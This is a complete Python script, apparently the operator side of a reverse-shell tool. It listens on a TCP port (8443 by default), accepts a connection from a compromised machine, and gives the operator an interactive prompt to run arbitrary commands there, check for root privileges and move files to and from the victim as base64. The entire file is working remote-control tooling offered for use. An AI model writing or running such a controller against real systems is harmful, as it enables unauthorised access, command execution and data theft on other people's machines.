#!/usr/bin/python3

import socket
import sys
import os
import argparse
import json
import base64
import random
import string
from datetime import datetime

ENCODING = "utf-8"

COMMANDS = []

def generate_random():
  ct = datetime.today().strftime('%Y%m%d%H%M%S')
  s = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
  return "upload_" + ct + "_" + s

def get_extension(filename):
  name, ext = os.path.splitext(filename)
  return ext

def reliable_send(data):
  json_data = json.dumps(data)
  target.send(bytes(json_data, encoding=ENCODING))

def reliable_recv():
  data = ""
  while True:
    try:
      recv = target.recv(1024).decode(ENCODING)
      data = data + recv
      return json.loads(data)
    except ValueError:
      continue

def whoami():
  try:
    reliable_send("whoami")
    current_user = reliable_recv().strip()
    return current_user
  except:
    print("[-] Could not receive current user.")
    sys.exit(1)

def pwd():
  try:
    reliable_send("pwd")
    current_dir = reliable_recv().strip()
    return current_dir
  except:
    print("[-] Could not receive current directory.")
    sys.exit(1)

def str_to_bytes(string):
  return str(string).encode(ENCODING)

def help():
  help_text = """
  --- BASIC ---
  cd        Change your current working directory
  download  Download a specific file from the remote file system
  upload    Upload a specific file to the remote file system
  admin     Check if the remote shell is running with ROOT privileges
  os        Check the remote system OS details
  hist      Check command history. You can use the exclamation mark ! to repeat a command.

  --- OTHER ---
  You may run any other commands according to the specific OS.
  """

  print(help_text)

def history():
  for i, c in enumerate(COMMANDS):
    print(i, c)

def history_cmd(idx):
  try:
    return COMMANDS[int(idx)]
  except:
    print("[-] No such command history")
    return None

def shell():
  global target
  global raddr
  global rport
  global COMMANDS

  while True:
    try:
      cmd = ""
      current_user = whoami()
      current_dir = pwd()

      cmd = input("%s@%s:%d:%s~$ " % (current_user, raddr, rport, current_dir))

      if cmd == "help":
        help()
        continue
      elif cmd == "hist":
        history()
        continue

      if cmd[0] == "!":
        tmp_idx_cmd = cmd.split("!")[1]
        cmd = history_cmd(tmp_idx_cmd)
        if cmd == None:
          continue
        print("[+] Running:", cmd)

      COMMANDS.append(cmd)
      reliable_send(cmd)

      if cmd == "exit":
        print("[*] Exited.")
        break

      tmp_cmd = cmd.split(" ")
 
      if tmp_cmd[0] == "download" and tmp_cmd[1] != "":
        try:
          print("Downloading file \"%s\"" % tmp_cmd[1])
          with open(tmp_cmd[1], "rb") as f:
            data = base64.b64encode(f.read()).decode(ENCODING)
            reliable_send(data)
        except Exception as e:
          reliable_send(str_to_bytes(e))
      elif tmp_cmd[0] == "upload" and tmp_cmd[1] != "":
        try:
          tmp_ext = get_extension(tmp_cmd[1])
          tmp_fname = generate_random() + tmp_ext
          print("Uploading file \"%s\" as \"%s\"" % (tmp_cmd[1], tmp_fname))
          with open(tmp_fname, "wb") as f:
            data = reliable_recv()
            f.write(base64.b64decode(data))
        except Exception as e:
          reliable_send(str_to_bytes(e))

      msg = reliable_recv().strip()
      if msg != "":
        print(msg)
    except KeyboardInterrupt:
      print("[*] Interrupted...")
      sys.exit(0)
    except Exception as e:
      print("[-] Something went wrong. Retry...")

def srv(srv_ip, srv_port):
  global s
  global ip
  global target
  global raddr
  global rport

  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((srv_ip, srv_port))
    s.listen(10)
    print("[+] Listening for incoming connections on %s:%d" % (srv_ip, srv_port))
  except:
    print("[-] Could not bind on %s:%d" % (srv_ip, srv_port))
    sys.exit(1)

  target, ip = s.accept()
  raddr = target.getpeername()[0]
  rport = target.getpeername()[1]
  print("[+] Connection established from %s:%d" % (raddr, rport))

def main():
  parser = argparse.ArgumentParser()
  parser.add_argument("-i", help="The listening IP address. Default: 0.0.0.0", default="0.0.0.0", type=str, required=False)
  parser.add_argument("-p", help="The listening port number. Default: 8443", default=8443, type=int, required=False)
  args = parser.parse_args()

  srv_ip = args.i
  srv_port = args.p

  srv(srv_ip, srv_port)
  shell()

if __name__ == "__main__":
  main()
